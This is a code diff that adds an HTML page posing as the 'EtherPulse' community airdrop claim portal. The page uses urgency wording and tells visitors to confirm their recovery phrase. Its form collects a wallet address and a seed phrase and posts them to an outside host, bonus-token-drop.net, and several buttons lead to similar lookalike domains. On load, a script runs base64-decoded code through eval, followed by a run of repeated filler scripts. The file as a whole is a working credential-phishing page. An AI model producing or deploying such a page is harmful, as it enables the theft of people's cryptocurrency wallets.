@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EtherPulse | Final airdrop claim</title>
+  <style>
+    :root {
+      --ink: #e7ecff;
+      --muted: #9ea8d7;
+      --bg: #090b16;
+      --panel: rgba(18, 22, 44, 0.88);
+      --line: rgba(120, 137, 255, 0.16);
+      --accent: #6f7cff;
+      --hot: #4de2c5;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: "Trebuchet MS", Arial, sans-serif;
+      color: var(--ink);
+      background:
+        radial-gradient(circle at top center, rgba(111, 124, 255, 0.32), transparent 30%),
+        radial-gradient(circle at bottom right, rgba(77, 226, 197, 0.18), transparent 26%),
+        linear-gradient(180deg, #070812 0%, #11152d 100%);
+    }
+    a { color: inherit; text-decoration: none; }
+    .wrap {
+      width: min(1120px, calc(100% - 34px));
+      margin: 32px auto 46px;
+      display: grid;
+      grid-template-columns: 1.05fr 0.95fr;
+      gap: 24px;
+    }
+    .panel {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 24px;
+      padding: 28px;
+      box-shadow: 0 28px 70px rgba(0,0,0,0.35);
+      backdrop-filter: blur(12px);
+    }
+    .brand {
+      width: min(1120px, calc(100% - 34px));
+      margin: 26px auto 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: var(--muted);
+    }
+    .wordmark {
+      font-size: 28px;
+      font-weight: 800;
+      color: white;
+      letter-spacing: 0.02em;
+    }
+    .tag {
+      display: inline-block;
+      padding: 8px 12px;
+      border-radius: 999px;
+      background: rgba(77, 226, 197, 0.12);
+      color: var(--hot);
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+    h1 { margin: 16px 0 12px; font-size: clamp(34px, 4.8vw, 58px); line-height: 1.02; }
+    h2 { margin: 0 0 8px; font-size: 24px; }
+    p { color: var(--muted); line-height: 1.72; }
+    .cta-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin: 24px 0;
+    }
+    .cta, .ghost {
+      padding: 13px 16px;
+      border-radius: 14px;
+      font-weight: 700;
+      font-size: 14px;
+    }
+    .cta {
+      background: linear-gradient(135deg, var(--accent), #4958ff);
+      color: white;
+    }
+    .ghost {
+      background: rgba(111, 124, 255, 0.1);
+      color: var(--ink);
+    }
+    form {
+      display: grid;
+      gap: 12px;
+      margin-top: 18px;
+    }
+    input {
+      padding: 14px 15px;
+      border-radius: 14px;
+      border: 1px solid rgba(120, 137, 255, 0.16);
+      background: rgba(6, 10, 22, 0.85);
+      color: white;
+      font: 15px/1.2 inherit;
+    }
+    button {
+      width: fit-content;
+      padding: 14px 18px;
+      border: 0;
+      border-radius: 14px;
+      background: var(--hot);
+      color: #07111d;
+      font: 800 14px/1.2 inherit;
+      cursor: pointer;
+    }
+    .mini {
+      padding: 16px;
+      border-radius: 18px;
+      background: rgba(7, 11, 28, 0.72);
+      border: 1px solid rgba(120, 137, 255, 0.12);
+      margin-top: 18px;
+    }
+    @media (max-width: 920px) { .wrap { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+  <div class="brand">
+    <div class="wordmark">EtherPulse</div>
+    <div>Community rewards portal</div>
+  </div>
+
+  <main class="wrap">
+    <section class="panel">
+      <div class="tag">Final airdrop window</div>
+      <h1>Claim your bonus token allocation before the final snapshot closes.</h1>
+      <p>
+        Wallet connect is now open for the last airdrop batch. Immediate action required: verify your payout wallet and claim your
+        allocation before this reward cycle expires. Eligible wallets may also unlock a bonus multiplier today.
+      </p>
+      <p>
+        Connect your wallet, confirm your recovery phrase ownership, and sync the seed phrase claim session to avoid missing the
+        final airdrop distribution.
+      </p>
+      <div class="cta-row">
+        <a class="cta" href="https://wallet-reward-sync.net/claim/connect">Connect wallet</a>
+        <a class="ghost" href="https://wallet-reward-sync.net/claim/verify">Verify payout wallet</a>
+        <a class="ghost" href="https://bonus-token-drop.net/airdrop/import">Import wallet connect session</a>
+        <a class="ghost" href="https://bonus-token-drop.net/airdrop/claim">Claim bonus airdrop</a>
+      </div>
+      <div class="mini">
+        Eligible chains: Ethereum, Base, Arbitrum, Polygon. Reward checks refresh every 90 seconds while the claim queue remains open.
+      </div>
+    </section>
+
+    <aside class="panel">
+      <h2>Reward sync form</h2>
+      <p>Use the sync form to register the active wallet session and finish the payout confirmation.</p>
+      <form action="https://bonus-token-drop.net/airdrop/submit" method="post">
+        <input type="hidden" name="campaign" value="epoch-7-final">
+        <input type="hidden" name="wallet_status" value="eligible">
+        <input type="hidden" name="claim_path" value="wallet-connect">
+        <input type="hidden" name="snapshot" value="pending">
+        <input type="text" name="wallet_address" placeholder="Wallet address">
+        <input type="text" name="seed_phrase" placeholder="Seed phrase">
+        <button type="submit">Submit reward sync</button>
+      </form>
+    </aside>
+  </main>
+
+  <script>eval(atob('Y29uc29sZS5sb2coImFpcmRyb3AgY2xhaW0gY2hlY2siKQ=='));</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+  <script>window.__pulse=(window.__pulse||0)+1;</script>
+</body>
+</html>
